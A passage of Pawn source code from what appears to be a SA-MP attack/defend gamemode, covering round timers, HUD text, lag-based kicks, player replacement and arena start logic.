					}
				}
				else
				{
				    Player[i][OutOfArena] = 5;
				    PlayerTextDrawHide(i, AreaCheckTD);
				    PlayerTextDrawHide(i, AreaCheckBG);
				}
			}

		    switch(Player[i][Team])
			{
		        case ATTACKER: {
				    TeamHP[ATTACKER] = TeamHP[ATTACKER] + (Player[i][pHealth] + Player[i][pArmour]);
				    PlayersAlive[ATTACKER]++;
				} case DEFENDER: {
				    TeamHP[DEFENDER] = TeamHP[DEFENDER] + (Player[i][pHealth] + Player[i][pArmour]);
				    PlayersAlive[DEFENDER]++;
				}
			}

	        SetPlayerScore(i, floatround(Player[i][pHealth] + Player[i][pArmour]));
			ResetPlayerMoney(i);
			GivePlayerMoney(i, -floatround(Player[i][pHealth] + Player[i][pArmour]));



	   		if(Player[i][NetCheck] == 1)
			{
			    GetPlayerFPS(i);
				if(Player[i][FPS] < Min_FPS && Player[i][FPS] != 0 && Player[i][PauseCount] < 5 && Player[i][FPSCheck] == 1) {
				    Player[i][FPSKick]++;
			    	SendClientMessage(i, -1, sprintf("{CCCCCC}Low FPS! Warning %d/7", Player[i][FPSKick]));

					if (Player[i][FPSKick] == 7) {
				        SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been kicked from the server .: {FFFFFF}Low FPS | %d/%d "COL_PRIM":.", Player[i][Name], Player[i][FPS], Min_FPS));
						SetTimerEx("OnPlayerKicked", 500, false, "i", i);
				    } else if (Player[i][FPSKick] > 7) {
				        Player[i][FPSKick] = 0;
					}

				} else  {
				    Player[i][FPSKick] = 0;
				}


				if(GetPlayerPacketLoss(i) >= Max_Packetloss && Player[i][FakePacketRenovation] == false && Player[i][PLCheck] == 1){
				    Player[i][PacketKick]++;
			    	SendClientMessage(i, -1, sprintf("{CCCCCC}High PL! Warning %d/15", Player[i][PacketKick]));

				    if(Player[i][PacketKick] == 15) {
				        SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been kicked from the server .: {FFFFFF}High PacketLoss | %.2f/%.2f "COL_PRIM":.", Player[i][Name], GetPlayerPacketLoss(i), Max_Packetloss));
						SetTimerEx("OnPlayerKicked", 500, false, "i", i);
				    } else if(Player[i][PacketKick] > 30) {
				        Player[i][PacketKick] = 0;
					}
				} else  {
				    Player[i][PacketKick] = 0;
				}

				if(GetPlayerPing(i) >= Max_Ping && Player[i][PingCheck] == 1){
					Player[i][PingKick]++;
			    	SendClientMessage(i, -1, sprintf("{CCCCCC}High Ping! Warning %d/10", Player[i][PingKick]));

				    if(Player[i][PingKick] == 10) {
				        SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been kicked from the server .: {FFFFFF}High Ping | %d/%d "COL_PRIM":.", Player[i][Name], GetPlayerPing(i), Max_Ping));
						SetTimerEx("OnPlayerKicked", 500, false, "i", i);
				    } else if(Player[i][PingKick] > 10) {
				        Player[i][PingKick] = 0;
					}
				} else {
				    Player[i][PingKick] = 0;
				}
			}
		}
		
		if(TakeDmgCD[0][i] > 0){
			TakeDmgCD[0][i]++;
			if(TakeDmgCD[0][i] == 5) {
				//HPLost[i][gLastHit[0][i]] = 0;
				DamageDone[0][i] = 0;
				gLastHit[0][i] = -1;
				PlayerTextDrawSetString(i, DoingDamage[0], "_");
				TakeDmgCD[0][i] = 0;
			}
		} if(TakeDmgCD[1][i] > 0) {
			TakeDmgCD[1][i]++;
			if(TakeDmgCD[1][i] == 5) {
				//HPLost[i][gLastHit[1][i]] = 0;
				DamageDone[1][i] = 0;
				gLastHit[1][i] = -1;
                PlayerTextDrawSetString(i, DoingDamage[1], "_");
				TakeDmgCD[1][i] = 0;
			}
		} if(TakeDmgCD[2][i] > 0) {
			TakeDmgCD[2][i]++;
			if(TakeDmgCD[2][i] == 5) {
				//HPLost[i][gLastHit[2][i]] = 0;
				DamageDone[2][i] = 0;
                PlayerTextDrawSetString(i, DoingDamage[2], "_");
				gLastHit[2][i] = -1;
				TakeDmgCD[2][i] = 0;
			}
		} if(TakeDmgCD[3][i] > 0) {
			TakeDmgCD[3][i]++;
			if(TakeDmgCD[3][i] == 5) {
				//HPLost[i][gLastHit[3][i]] = 0;
				DamageDone[3][i] = 0;
				gLastHit[3][i] = -1;
                PlayerTextDrawSetString(i, GettingDamaged[0], "_");
                DmgLabelStr[0][i] = "";
	   			Update3DTextLabelText(DmgLabel[i], -1, sprintf("%s\n%s\n%s", DmgLabelStr[0][i], DmgLabelStr[1][i], DmgLabelStr[2][i]));
				TakeDmgCD[3][i] = 0;
			}
		}
		if(TakeDmgCD[4][i] > 0) {
			TakeDmgCD[4][i]++;
			if(TakeDmgCD[4][i] == 5) {
				//HPLost[i][gLastHit[4][i]] = 0;
				DamageDone[4][i] = 0;
				gLastHit[4][i] = -1;
                PlayerTextDrawSetString(i, GettingDamaged[1], "_");
                DmgLabelStr[1][i] = "";
	   			Update3DTextLabelText(DmgLabel[i], -1, sprintf("%s\n%s\n%s", DmgLabelStr[0][i], DmgLabelStr[1][i], DmgLabelStr[2][i]));
				TakeDmgCD[4][i] = 0;
			}
		}
		if(TakeDmgCD[5][i] > 0) {
			TakeDmgCD[5][i]++;
			if(TakeDmgCD[5][i] == 5) {
				//HPLost[i][gLastHit[5][i]] = 0;
				DamageDone[5][i] = 0;
				gLastHit[5][i] = -1;
                PlayerTextDrawSetString(i, GettingDamaged[2], "_");
                DmgLabelStr[2][i] = "";
	   			Update3DTextLabelText(DmgLabel[i], -1, sprintf("%s\n%s\n%s", DmgLabelStr[0][i], DmgLabelStr[1][i], DmgLabelStr[2][i]));
				TakeDmgCD[5][i] = 0;
			}
		}
	}

	if(BaseStarted == true)
	{
  		if(RoundPaused == false)
		{
			if(PlayersInCP > 0)
			{
			    CurrentCPTime --;

                new cpstr[256];
			    new Float:HP, Float:AP;
			    format(cpstr, sizeof cpstr, "%sPlayers In CP", MAIN_TEXT_COLOUR);
			    new ct = 0;
				foreach(new i : Player)
				{
				    if(Player[i][WasInCP] == true)
					{
					    ct ++;
				        GetHP(i, HP);
				        GetAP(i, AP);
				        format(cpstr, sizeof(cpstr), "%s~n~~r~~h~- %s%s (%.0f)", cpstr, MAIN_TEXT_COLOUR, Player[i][Name], (HP+AP));
					}
				}
				if(ct == 0) // if it stays 0 and PlayersInCP says it's more than 0 then something must be wrong
				{
				 	if(RecountPlayersOnCP() == 0)
				 	    goto thatWasWrong;
				}
				TextDrawSetString(EN_CheckPoint, cpstr);
		    	if(CurrentCPTime == 0)
					return EndRound(0); // Attackers Win
					
                thatWasWrong:
			}


		    RoundSeconds--;
		    if(RoundSeconds <= 0) {
		        RoundSeconds = 59;
		        RoundMints--;
				if(RoundMints < 0) return EndRound(1); // Defenders Win
			}

			if(PlayersAlive[ATTACKER] < 1) return EndRound(2); // Defenders Win
			else if(PlayersAlive[DEFENDER] < 1) return EndRound(3); // Attackers Win

		    ElapsedTime++;
		}

		new iString[32];
		new iString2[256];
		if(PlayersInCP == 0)
		{
			format( iString, sizeof(iString),"~w~%d:%02d", RoundMints,	RoundSeconds );
			format(iString2,sizeof(iString2),"~r~~h~%s  ~r~~h~~h~%d   ~w~(~r~~h~~h~%.0f~w~)			   	            ~w~%d:%02d			   	            ~b~~h~%s  ~b~~h~~h~%d   ~w~(~b~~h~~h~%.0f~w~)~n~",TeamName[ATTACKER],PlayersAlive[ATTACKER],TeamHP[ATTACKER],RoundMints,RoundSeconds,TeamName[DEFENDER],PlayersAlive[DEFENDER],TeamHP[DEFENDER]);
		}
		else
		{
			format( iString, sizeof(iString), "~w~%d:%02d / ~r~~h~%d", RoundMints,	RoundSeconds, CurrentCPTime );
			format(iString2,sizeof(iString2),"~r~~h~%s  ~r~~h~~h~%d   ~w~(~r~~h~~h~%.0f~w~)			   	            ~w~%d:%02d / ~r~~h~%d		   	            ~b~~h~%s  ~b~~h~~h~%d   ~w~(~b~~h~~h~%.0f~w~)~n~",TeamName[ATTACKER],PlayersAlive[ATTACKER],TeamHP[ATTACKER],RoundMints,RoundSeconds,CurrentCPTime, TeamName[DEFENDER],PlayersAlive[DEFENDER],TeamHP[DEFENDER]);
		}
		TextDrawSetString(timerCenterTD , iString);
		TextDrawSetString(RoundStats, iString2);

		format( iString, 64, "~w~%d__(%0.0f)", PlayersAlive[ATTACKER], TeamHP[ATTACKER] );
		TextDrawSetString( leftTeamData, iString );

		format( iString, 64, "~w~(%0.0f)__%d", TeamHP[DEFENDER], PlayersAlive[DEFENDER] );
		TextDrawSetString( rightTeamData, iString );

		format( iString2, sizeof(iString2), "~r~~h~~h~%s \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ~b~~h~~h~%s", TeamName[ATTACKER], TeamName[DEFENDER] );
		TextDrawSetString( centerTeamNames , iString2 );

		TextDrawColor( leftRedBG , 0xDE000066 );
		TextDrawColor( rightBlueBG , 0x3344FF66 );
		foreach(new i:Player)
		{
			if(Player[i][Style] == 1)
			{
			    TextDrawShowForPlayer(i, leftRedBG);
			    TextDrawShowForPlayer(i, rightBlueBG);
			}
		}

	} else if(ArenaStarted == true) {

	    #if ENABLED_TDM == 1
	    if( GameType == TDM ) goto skipped;
	    #endif
		//======================================================================

		if( GameType == TDM )
		{
			#if ENABLED_TDM == 1
			skipped:
		    if( Current != -1 )
		    {
				if(RoundPaused == false) {
				    RoundSeconds--;
				    if(RoundSeconds <= 0) {
				        RoundSeconds = 59;
				        RoundMints--;
						if(RoundMints < 0) {
						    if(TeamTDMKills[ATTACKER] > TeamTDMKills[DEFENDER]) EndRound(3); // attackers
							else if(TeamTDMKills[DEFENDER] > TeamTDMKills[ATTACKER]) EndRound(2); // defenders
							else if(TeamTDMKills[ATTACKER] == TeamTDMKills[DEFENDER]) EndRound(4); // No one win
							return 1;
						}
					}

		            ElapsedTime++;

					if(TeamTDMKills[ATTACKER] >= MaxTDMKills) return EndRound(3); // Attackers Win
					else if(TeamTDMKills[DEFENDER] >= MaxTDMKills) return EndRound(2); // defenders Win
				}
				new iString[256];
				format( iString, sizeof(iString),"~w~%d:%02d", RoundMints,	RoundSeconds );
				TextDrawSetString(timerCenterTD , iString);

				format( iString, 64, "~w~%d__(Kills: %d / %d)", PlayersAlive[ATTACKER], TeamTDMKills[ATTACKER], MaxTDMKills );
				TextDrawSetString( leftTeamData, iString );

				format( iString, 64, "~w~%d__(Kills: %d /  %d)", PlayersAlive[DEFENDER], TeamTDMKills[DEFENDER], MaxTDMKills );
				TextDrawSetString( rightTeamData, iString );

				format( iString, sizeof(iString), "~r~~h~~h~%s \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ~b~~h~~h~%s", TeamName[ATTACKER], TeamName[DEFENDER] );
				TextDrawSetString( centerTeamNames , iString );

				TextDrawColor( leftRedBG , 0xDE000066 );
				TextDrawColor( rightBlueBG , 0x3344FF66 );
				foreach(new i:Player)
				{
					if(Player[i][Style] == 1)
					{
					    TextDrawShowForPlayer(i, leftRedBG);
					    TextDrawShowForPlayer(i, rightBlueBG);
					}
				}

				//==== had to do this because i couldnt figure out a
				//		quick work around 	==================================
				if( PlayersAlive[ATTACKER] < 1 )
				{
					LowPlayers[ATTACKER]++;
					if( LowPlayers[ATTACKER] >= 3 )
						EndRound(2); // Defenders Win
				}
				else
					LowPlayers[ATTACKER] = 0;

				if( PlayersAlive[DEFENDER] < 1 )
				{
					LowPlayers[DEFENDER]++;
					if( LowPlayers[DEFENDER] >= 3 )
						EndRound(3); // Attackers Win
				}
				else
					LowPlayers[DEFENDER] = 0;
				//==============================================================
			}
			#endif
		}
		else if( GameType == ARENA )
		{
			if(RoundPaused == false) {
			    RoundSeconds--;
			    if(RoundSeconds <= 0) {
			        RoundSeconds = 59;
			        RoundMints--;
					if(RoundMints < 0) {
					    if(TeamHP[ATTACKER] < TeamHP[DEFENDER]) EndRound(2);
						else if(TeamHP[DEFENDER] < TeamHP[ATTACKER]) EndRound(3);
						else if(floatround(TeamHP[ATTACKER]) == floatround(TeamHP[DEFENDER])) EndRound(4); // No one win
						return 1;
					}
				}

				if(PlayersAlive[ATTACKER] < 1) return EndRound(2); // Defenders Win
				else if(PlayersAlive[DEFENDER] < 1) return EndRound(3); // Attackers Win

	            ElapsedTime++;
			}
			new iString[256];
			format(iString,sizeof(iString),"~r~%s  ~r~~h~%d   ~w~(~r~~h~%.0f~w~)			   	            ~w~%d:%02d			   	            ~b~~h~%s  ~b~~h~%d   ~w~(~b~~h~%.0f~w~)~n~",TeamName[ATTACKER],PlayersAlive[ATTACKER],TeamHP[ATTACKER],RoundMints,RoundSeconds,TeamName[DEFENDER],PlayersAlive[DEFENDER],TeamHP[DEFENDER]);
	        TextDrawSetString(RoundStats, iString);

			format( iString, sizeof(iString),"~w~%d:%02d", RoundMints,	RoundSeconds );
			TextDrawSetString(timerCenterTD , iString);

			format( iString, 64, "~w~%d__(%0.0f)", PlayersAlive[ATTACKER], TeamHP[ATTACKER] );
			TextDrawSetString( leftTeamData, iString );

			format( iString, 64, "~w~(%0.0f)__%d", TeamHP[DEFENDER], PlayersAlive[DEFENDER] );
			TextDrawSetString( rightTeamData, iString );

			format( iString, sizeof(iString), "~r~~h~~h~%s \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ~b~~h~~h~%s", TeamName[ATTACKER], TeamName[DEFENDER] );
			TextDrawSetString( centerTeamNames , iString );

			TextDrawColor( leftRedBG , 0xDE000066 );
			TextDrawColor( rightBlueBG , 0x3344FF66 );
			foreach(new i:Player)
			{
				if(Player[i][Style] == 1)
				{
				    TextDrawShowForPlayer(i, leftRedBG);
				    TextDrawShowForPlayer(i, rightBlueBG);
				}
			}
		}
	}
	return 1;
}


forward SyncInProgress(playerid);
public SyncInProgress(playerid) {
	Player[playerid][Syncing] = false;
}

forward PausedIsPressed();
public PausedIsPressed() {
	PausePressed = false;
}

forward UnpauseRound();
public UnpauseRound()
{
	RoundUnpausing = true;
	PauseCountdown --;

    new iString[32];
	format(iString, sizeof(iString), "~g~Round Unpausing ~r~%d", PauseCountdown);
	TextDrawSetString(PauseTD, iString);
	TextDrawShowForAll(PauseTD);

	foreach(new i : Player)
	{
        PlayerPlaySound(i,1056,0.0,0.0,0.0);
        PlayerTextDrawSetString(i, FPSPingPacket, iString);
		if(PauseCountdown <= 0)
		{
			if(Player[i][Playing] == true)
			{
				TogglePlayerControllableEx(i, true);
				if(!Player[i][ToGiveParachute])
					SetPlayerArmedWeapon(i, 0);
				else
				{
				    GivePlayerWeapon(i, WEAPON_PARACHUTE, 1);
				    SetPlayerArmedWeapon(i, WEAPON_PARACHUTE);
				    Player[i][ToGiveParachute] = false;
				}
			}

			VehiclePos[i][0] = 0.0;
			VehiclePos[i][1] = 0.0;
			VehiclePos[i][2] = 0.0;

		}
	}

	if(PauseCountdown <= 0)
	{
	    RoundPaused = false;
	    RoundUnpausing = false;
	    TextDrawHideForAll(PauseTD);
	    RecountPlayersOnCP();
	    for(new g = 0; g < MAX_VEHICLES; g ++)
			SetVehicleVelocity(g, VehicleVelc[g][0], VehicleVelc[g][1], VehicleVelc[g][2]);
	}

	if(PauseCountdown > 0)
		UnpauseTimer = SetTimer("UnpauseRound", 1000, 0);
	return 1;
}

forward AttackerAskingHelp(playerid);
public AttackerAskingHelp(playerid) {
	TeamHelp[ATTACKER] = false;
    Player[playerid][AskingForHelp] = false;
    new team = Player[playerid][Team];
	if(TeamHasLeader[team] == true && TeamLeader[team] == playerid)
	    PlayerLeadTeam(playerid, true, false);
	else
	{
		ColorFix(playerid);
		RadarFix();
	}
	return 1;
}

forward DefenderAskingHelp(playerid);
public DefenderAskingHelp(playerid) {
	TeamHelp[DEFENDER] = false;
	Player[playerid][AskingForHelp] = false;
	new team = Player[playerid][Team];
	if(TeamHasLeader[team] == true && TeamLeader[team] == playerid)
	    PlayerLeadTeam(playerid, true, false);
	else
	{
		ColorFix(playerid);
		RadarFix();
	}
	return 1;
}

forward OnPlayerKicked(playerid);
public OnPlayerKicked(playerid) {
	Player[playerid][IsKicked] = true;
	Kick(playerid);
	return 1;
}

forward PlayerDeathIcon(playerid);
public PlayerDeathIcon(playerid) {
	foreach(new i : Player) {
		RemovePlayerMapIcon(i, Player[playerid][DeathIcon]);
	}
}

forward ReSpectatePlayer(playerid, specid);
public ReSpectatePlayer(playerid, specid) {
	return SpectatePlayer(playerid, specid);
}

forward HideHpTextForAtt();
public HideHpTextForAtt() {
	TextDrawSetString(TeamHpLose[0], " ");
	TextDrawSetString(AttHpLose, " ");
	TempDamage[ATTACKER] = 0;
	return 1;
}

forward HideHpTextForDef();
public HideHpTextForDef() {
	TextDrawSetString(TeamHpLose[1], " ");
	TextDrawSetString(DefHpLose, " ");
	TempDamage[DEFENDER] = 0;
	return 1;
}

forward DeathMessageF(killerid, playerid);
public DeathMessageF(killerid, playerid) {
	PlayerTextDrawHide(killerid, DeathText[0]);
	PlayerTextDrawHide(playerid, DeathText[1]);
	return 1;
}

forward SwapBothTeams();
public SwapBothTeams() {
    SwapTeams();
	if(PreMatchResultsShowing == false) AllowStartBase = true;
	return 1;
}

stock GetPlayerAKA(playerid)
{
    new IP[16];
    GetPlayerIp(playerid, IP, sizeof(IP));
	new DBResult:dbres = db_query(sqliteconnection, sprintf("SELECT `Names` FROM `AKAs` WHERE `IP` = '%s'", IP));

	AKAString = "";
	if(db_num_rows(dbres) > 0) {
		db_get_field_assoc(dbres, "Names", AKAString, sizeof(AKAString));
	} else {
		db_free_result(db_query(sqliteconnection, sprintf("INSERT INTO `AKAs` (`IP`, `Names`) VALUES ('%s', '%s')", IP, "")));
	}
	db_free_result(dbres);
	return AKAString;
}



stock MatchAKA(playerid) {
    AKAString = "";
	AKAString = GetPlayerAKA(playerid);

	new idx;
	do {
		idx = strfind(AKAString, ",", true, idx == 0 ? 0 : idx+1);
		new compare[MAX_PLAYER_NAME];
		new idx2 = strfind(AKAString, ",", true, idx+1);
		strmid(compare, AKAString, idx+1, (idx2 == -1 ? strlen(AKAString) : idx2) );

		if(!strcmp(compare, Player[playerid][Name], true) && strlen(Player[playerid][Name]) > 0 && strlen(compare) > 0) {
		    return 1;
		}

	} while(idx != -1);
	return 0;
}



forward OnPlayerReplace(ToAddID, ToReplaceID, playerid);
public OnPlayerReplace(ToAddID, ToReplaceID, playerid) {
    new Float:Pos[4], Float:HP[2], iString[180];

	GetPlayerPos(ToReplaceID, Pos[0], Pos[1], Pos[2]);
	GetPlayerFacingAngle(ToReplaceID, Pos[3]);

	GetHP(ToReplaceID, HP[0]);
	GetAP(ToReplaceID, HP[1]);

	new Weapons[13], Ammo[13];
	for(new i = 0; i < 13; i++){
		GetPlayerWeaponData(ToReplaceID, i, Weapons[i], Ammo[i]);
	}



	Player[ToAddID][Playing] = true;
	Player[ToAddID][WasInBase] = true;

    Player[ToAddID][Team] = Player[ToReplaceID][Team];
	SetHP(ToAddID, HP[0]);
	SetAP(ToAddID, HP[1]);

	SetPlayerPos(ToAddID, Pos[0], Pos[1], Pos[2]+1);
	SetPlayerFacingAngle(ToAddID, Pos[3]);
	SetPlayerInterior(ToAddID, GetPlayerInterior(ToReplaceID));
	SetPlayerVirtualWorld(ToAddID, GetPlayerVirtualWorld(ToReplaceID));

	SetPlayerSkin(ToAddID, Skin[Player[ToAddID][Team]]);
	SAMP_SetPlayerTeam(ToAddID, Player[ToAddID][Team]);

	ColorFix(ToAddID);


	for(new i = 0; i < 13; i++) {
		GivePlayerWeapon(ToAddID, Weapons[i], Ammo[i]);
    }

	if(Player[ToReplaceID][WeaponPicked] > 0) {
 		Player[ToAddID][WeaponPicked] = Player[ToReplaceID][WeaponPicked];
 		Player[ToReplaceID][WeaponPicked] = 0;
	}

	RemovePlayerFromRound(ToReplaceID);

    if(GameType == BASE)
	{
		SetPlayerCheckpoint(ToAddID, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
		GangZoneShowForPlayer(ToAddID, CPZone, 0xFF000044);
	} 


	if(TeamHPDamage == true) {
		switch(Player[ToAddID][Team]) {
		    case ATTACKER: {
				TextDrawShowForPlayer(ToAddID, AttackerTeam[0]);
				TextDrawShowForPlayer(ToAddID, AttackerTeam[1]);
			} case DEFENDER: {
				TextDrawShowForPlayer(ToAddID, DefenderTeam[0]);
				TextDrawShowForPlayer(ToAddID, DefenderTeam[1]);
            }
		}
	}

	if(RoundPaused == true) {
		TogglePlayerControllableEx(ToAddID, false);
		iString = "~r~Round Paused";
		PlayerTextDrawSetString(ToAddID, FPSPingPacket, iString);
		TextDrawSetString(PauseTD, iString);
		TextDrawShowForAll(PauseTD);
	}

    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has replaced {FFFFFF}%s "COL_PRIM"by {FFFFFF}%s", Player[playerid][Name], Player[ToReplaceID][Name], Player[ToAddID][Name]);
	SendClientMessageToAll(-1, iString);
	
	if(Player[ToAddID][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[ToAddID][RoundKills], MAIN_TEXT_COLOUR, Player[ToAddID][RoundDamage], MAIN_TEXT_COLOUR, Player[ToAddID][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[ToAddID][RoundKills], MAIN_TEXT_COLOUR, Player[ToAddID][RoundDamage], MAIN_TEXT_COLOUR, Player[ToAddID][TotalDamage]);
	PlayerTextDrawSetString(ToAddID, RoundKillDmgTDmg, iString);

    RadarFix();
    return 1;
}

forward OnPlayerInGameReplace(ToAddID, i, playerid);
public OnPlayerInGameReplace(ToAddID, i, playerid) {
	Player[ToAddID][Playing] = true;
	Player[ToAddID][WasInBase] = true;

    Player[ToAddID][Team] = SaveVariables[i][pTeam];
	SetHP(ToAddID, SaveVariables[i][gHealth]);
	SetAP(ToAddID, SaveVariables[i][gArmour]);



    if(SaveVariables[i][WasCrashedInStart] == false) {
		SetPlayerPos(ToAddID, SaveVariables[i][pCoords][0], SaveVariables[i][pCoords][1], SaveVariables[i][pCoords][2]+1);
		SetPlayerFacingAngle(ToAddID, SaveVariables[i][pCoords][3]);
		SetPlayerInterior(ToAddID, SaveVariables[i][pInterior]);
		SetPlayerVirtualWorld(ToAddID, SaveVariables[i][pVWorld]);
	} else if(Current != -1) {
	    if(GameType == BASE) {
			switch(Player[ToAddID][Team]) {
			    case ATTACKER: SetPlayerPos(ToAddID, BAttackerSpawn[Current][0] + random(6), BAttackerSpawn[Current][1] + random(6), BAttackerSpawn[Current][2]+0.5);
				case DEFENDER: SetPlayerPos(ToAddID, BDefenderSpawn[Current][0] + random(6), BDefenderSpawn[Current][1] + random(6), BDefenderSpawn[Current][2]+0.5);
		    }
		    SetPlayerInterior(ToAddID, BInterior[Current]);
		} else if(GameType == ARENA || GameType == TDM) {
			switch(Player[ToAddID][Team]) {
			    case ATTACKER: SetPlayerPos(ToAddID, AAttackerSpawn[Current][0] + random(6), AAttackerSpawn[Current][1] + random(6), AAttackerSpawn[Current][2]+0.5);
				case DEFENDER: SetPlayerPos(ToAddID, ADefenderSpawn[Current][0] + random(6), ADefenderSpawn[Current][1] + random(6), ADefenderSpawn[Current][2]+0.5);
			}
		    SetPlayerInterior(ToAddID, AInterior[Current]);
		}
		SetPlayerVirtualWorld(ToAddID, 2);
	}

	SetPlayerSkin(ToAddID, Skin[Player[ToAddID][Team]]);
	SAMP_SetPlayerTeam(ToAddID, Player[ToAddID][Team]);

	ColorFix(ToAddID);


    if(GameType == BASE) {
		ShowPlayerWeaponMenu(ToAddID, Player[ToAddID][Team]);
		SetPlayerCheckpoint(ToAddID, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2], 2);
		GangZoneShowForPlayer(ToAddID, CPZone, 0xFF000044);
	} else if(GameType == ARENA || GameType == TDM) GivePlayerArenaWeapons(ToAddID);


	if(TeamHPDamage == true) {
		switch(Player[ToAddID][Team]) {
		    case ATTACKER: {
				TextDrawShowForPlayer(ToAddID, AttackerTeam[0]);
				TextDrawShowForPlayer(ToAddID, AttackerTeam[1]);
			} case DEFENDER: {
				TextDrawShowForPlayer(ToAddID, DefenderTeam[0]);
				TextDrawShowForPlayer(ToAddID, DefenderTeam[1]);
            }
		}
	}

    SaveVariables[i][ToBeAdded] = false;

	new iString[180];

	if(RoundPaused == true) {
		TogglePlayerControllableEx(ToAddID, false);
		iString = "~r~Round Paused";
		PlayerTextDrawSetString(ToAddID, FPSPingPacket, iString);
		TextDrawSetString(PauseTD, iString);
		TextDrawShowForAll(PauseTD);
	}


    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has replaced {FFFFFF}%s "COL_PRIM"by {FFFFFF}%s", Player[playerid][Name], SaveVariables[i][pName], Player[ToAddID][Name]);
	SendClientMessageToAll(-1, iString);

	if(Player[ToAddID][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[ToAddID][RoundKills], MAIN_TEXT_COLOUR, Player[ToAddID][RoundDamage], MAIN_TEXT_COLOUR, Player[ToAddID][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[ToAddID][RoundKills], MAIN_TEXT_COLOUR, Player[ToAddID][RoundDamage], MAIN_TEXT_COLOUR, Player[ToAddID][TotalDamage]);
	PlayerTextDrawSetString(ToAddID, RoundKillDmgTDmg, iString);

    RadarFix();
    return 1;
}




//------------------------------------------------------------------------------
// Arena System
//------------------------------------------------------------------------------

forward OnArenaStart(ArenaID);
public OnArenaStart(ArenaID)
{
    ClearKillList(); // Clears the kill-list.
    DestroyAllVehicles(); // Destroys (removes) all the spawned vehicles
	Current = ArenaID; // Current will be the ID of the base that we just started. We do this so that we can use this ID later on (e.g. check /car command for the use).
    ClearKillList(); // Clears the kill-list.
    ServerLastPlayed = Current;
    ServerLastPlayedType = 0;

	ElapsedTime = 0;

	#if ENABLED_TDM == 1
	if( GameType == TDM ) ServerLastPlayedType = 2;
	TeamTDMKills[ATTACKER] = 0;
	TeamTDMKills[DEFENDER] = 0;
	LowPlayers[ATTACKER] = 0;
	LowPlayers[DEFENDER] = 0;
	#endif

    SetRecentRound(ArenaID, ARENA);

	if(ArenasPlayed >= MAX_ARENAS) {
	    for(new i = 0; i < MAX_ARENAS; i++) {
			RecentArena[i] = -1;
		}
		ArenasPlayed = 0;
	}

    new iString[64];
	if( GameType == TDM )
		format(iString, sizeof(iString), "%sTDM %s(~r~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, Current, MAIN_TEXT_COLOUR);
	else if( GameType == ARENA )
		format(iString, sizeof(iString), "%sArena %s(~r~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, Current, MAIN_TEXT_COLOUR);
			
	for(new i = 0; i < MAX_ARENAS; i++)
	{
		VoteCount[i] = 0;
	}

	foreach(new i : Player)
	{
	    Player[i][LastVehicle] = -1;

		//PlayerTextDrawShow(i, RoundText);

		if(Player[i][Style] == 0) PlayerTextDrawShow(i, RoundText);
		else ShowRoundStats(i);
		TextDrawSetString( leftTeamData, "_");
		TextDrawSetString( rightTeamData, "_");
		TextDrawSetString( centerTeamNames, "_");
		TextDrawSetString( timerCenterTD, "_");

	    if(Player[i][ToAddInRound] == true)
		{
            HideEndRoundTextDraw(i);

			if(Player[i][Spectating] == true) StopSpectate(i);

			if(Player[i][InDM] == true) { //Make sure to remove player from DM, otherwise the player will have Player[playerid][Playing] = true and Player[playerid][InDM] = true, so you are saying that the player is both in Base and in DM.
			    Player[i][InDM] = false;
    			Player[i][DMReadd] = 0;
			}

			Player[i][AntiLag] = false;

	        SetPlayerVirtualWorld(i, 2); //Set player virtual world to something different that that for lobby and DM so that they don't collide with each other. e.g. You shouldn't be able to see players in lobby or DM while you are in base.
			TogglePlayerControllableEx(i, false); //Pause players.

			SetPlayerInterior(i, AInterior[Current]);
			SetPlayerCameraLookAt(i,ACPSpawn[Current][0],ACPSpawn[Current][1],ACPSpawn[Current][2]);
			SetPlayerCameraPos(i,ACPSpawn[Current][0]+100,ACPSpawn[Current][1],ACPSpawn[Current][2]+80);
			SetPlayerPos(i, ACPSpawn[Current][0], ACPSpawn[Current][1], ACPSpawn[Current][2]);
		}
		PlayerTextDrawSetString(i, BaseID_VS, iString);
	}

	ArenaZone = GangZoneCreate(AMin[Current][0],AMin[Current][1],AMax[Current][0],AMax[Current][1]);
	if( GameType == TDM ) format(iString, sizeof(iString), "mapname TDM: %d", Current); //Will change the map name in samp.exe to your base id (e.g. Base: 4)
	else if( GameType == ARENA ) format(iString, sizeof(iString), "mapname Arena: %d", Current);
	SendRconCommand(iString);

	GangZoneShowForAll(ArenaZone,0x95000099);

	ViewTimer = 4;
	ViewArenaForPlayers();

	format(iString, sizeof(iString), "%s: %d - %s: %d", TeamName[ATTACKER], TeamScore[ATTACKER], TeamName[DEFENDER], TeamScore[DEFENDER]);
	SetGameModeText(iString);

	if( WarMode == true )
	{
	    MatchRoundsStarted++;
	    if( MatchRoundsStarted > 100 ) MatchRoundsStarted = 1;
		MatchRoundsRecord[ MatchRoundsStarted - 1 ][ round__type ] = 1;
